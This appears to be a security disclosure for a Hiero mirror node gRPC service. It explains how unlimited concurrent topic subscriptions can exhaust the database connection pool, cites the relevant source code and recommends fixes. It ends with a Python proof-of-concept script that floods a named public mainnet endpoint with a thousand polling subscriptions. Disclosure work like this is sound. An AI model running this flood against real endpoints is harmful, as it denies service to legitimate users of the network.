### Title
Unbounded Concurrent gRPC Subscriptions Enable DB Resource Exhaustion via No-Limit Poll Loop

### Summary
An unauthenticated attacker can open an arbitrary number of gRPC connections to `subscribeTopic`, each with `limit=0` (no-limit) and a historical `startTime`, causing `PollingTopicMessageRetriever.poll()` to issue repeated `maxPageSize=1000`-row DB queries per subscription indefinitely. With no global subscription cap enforced, many concurrent subscriptions exhaust the DB connection pool, denying service to all legitimate HCS topic message consumers.

### Finding Description

**Exact code path:**

In `grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java`, lines 68–71:

```java
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getTotal().get())
        : Integer.MAX_VALUE;
int pageSize = Math.min(limit, context.getMaxPageSize());
```

`TopicMessageFilter.hasLimit()` returns `limit > 0`, so `limit=0` (the protobuf default / "no limit" sentinel) causes `limit = Integer.MAX_VALUE`, and `pageSize = Math.min(Integer.MAX_VALUE, 1000) = 1000` (the default `maxPageSize`).

**Repeat behavior:** In `retrieve()` (line 52), the throttled path sets `numRepeats = Long.MAX_VALUE` and `frequency = 2s`. The `isComplete()` check at line 121–128 only terminates when `pageSize.get() < retrieverProperties.getMaxPageSize()` — i.e., when a page returns fewer than 1000 rows. If the topic has ≥1000 historical messages, the retriever polls the DB every 2 seconds forever, issuing a `LIMIT 1000` query each time.

**No global subscription limit:** `TopicMessageServiceImpl` tracks `subscriberCount` only as a Micrometer gauge (lines 52–55) — it is never checked or enforced as a cap. The only per-connection limit is `maxConcurrentCallsPerConnection = 5` (NettyProperties line 14, GrpcConfiguration line 33), which limits calls per TCP connection but does not bound total connections.

**Root cause:** The combination of (a) `limit=0` → `Integer.MAX_VALUE` → `pageSize=maxPageSize` per poll, (b) indefinite repeat for throttled subscriptions, and (c) no enforced global subscriber ceiling means each unauthenticated connection contributes 5 concurrent DB-polling subscriptions with no termination condition.

### Impact Explanation

Each active no-limit subscription issues one `SELECT … LIMIT 1000` query to the DB every 2 seconds. With N concurrent subscriptions, the DB receives N/2 queries per second. The HikariCP connection pool for the gRPC service is finite; once saturated, all new DB queries queue or fail. This denies service to all legitimate HCS topic message subscribers, preventing delivery of consensus topic messages (the application-layer gossip mechanism for HCS). The `retrieverProperties.getTimeout()` of 60s (line 28 of `RetrieverProperties`) is an *inactivity* timeout — it only fires if no messages are emitted for 60s, so a topic with active historical data keeps subscriptions alive indefinitely.

### Likelihood Explanation

No authentication is required to call `subscribeTopic`. The gRPC port (default 5600) is publicly exposed. An attacker needs only a gRPC client (e.g., `grpcurl`, the Hedera SDK, or a custom script) and the ability to open many TCP connections. Opening 200 connections × 5 calls each = 1000 concurrent subscriptions, each polling at 1000 rows/2s = 500,000 DB rows read per second. This is trivially scriptable and repeatable from a single host or botnet.

### Recommendation

1. **Enforce a global subscription cap:** Check `subscriberCount` against a configurable maximum in `TopicMessageServiceImpl.subscribeTopic()` and return `RESOURCE_EXHAUSTED` if exceeded.
2. **Per-IP connection limiting:** Add a gRPC `ServerInterceptor` that tracks and caps concurrent streams per remote address.
3. **Enforce a maximum subscription duration:** Apply an absolute wall-clock timeout (not just inactivity) to each subscription via `.timeout(maxDuration)` regardless of message flow.
4. **Treat `limit=0` as bounded:** Consider mapping `limit=0` to a configurable maximum rather than `Integer.MAX_VALUE`, or require callers to explicitly set a large limit.

### Proof of Concept

```python
# Requires: pip install grpcio grpcio-tools hedera-sdk or raw proto stubs
import grpc, threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror.mainnet.hedera.com:443"  # or any exposed gRPC endpoint

def flood():
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery()
    query.topicID.topicNum = 1          # any existing topic
    query.consensusStartTime.seconds = 0  # start from genesis
    # limit field omitted → defaults to 0 → no-limit path → Integer.MAX_VALUE
    for _ in range(5):  # maxConcurrentCallsPerConnection
        threading.Thread(target=lambda: list(stub.subscribeTopic(query))).start()

# Open hundreds of connections
for _ in range(200):
    threading.Thread(target=flood).start()
# Result: 1000 concurrent subscriptions each polling DB every 2s with LIMIT 1000
# DB connection pool exhausted; legitimate subscribers receive errors
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L65-79)
```java
    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getTotal().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, context.getMaxPageSize());
        var startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        context.getPageSize().set(0L);

        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        log.debug("Executing query: {}", newFilter);
        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L94-108)
```java
        private PollingContext(TopicMessageFilter filter, boolean throttled) {
            this.filter = filter;
            this.throttled = throttled;

            if (throttled) {
                numRepeats = Long.MAX_VALUE;
                frequency = retrieverProperties.getPollingFrequency();
                maxPageSize = retrieverProperties.getMaxPageSize();
            } else {
                RetrieverProperties.UnthrottledProperties unthrottled = retrieverProperties.getUnthrottled();
                numRepeats = unthrottled.getMaxPolls();
                frequency = unthrottled.getPollingFrequency();
                maxPageSize = unthrottled.getMaxPageSize();
            }
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L121-128)
```java
        boolean isComplete() {
            boolean limitHit = filter.hasLimit() && filter.getLimit() == total.get();

            if (throttled) {
                return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
            }

            return limitHit;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/RetrieverProperties.java (L21-28)
```java
    @Min(32)
    private int maxPageSize = 1000;

    @NotNull
    private Duration pollingFrequency = Duration.ofSeconds(2L);

    @NotNull
    private Duration timeout = Duration.ofSeconds(60L);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-55)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L39-41)
```java
    public boolean hasLimit() {
        return limit > 0;
    }
```
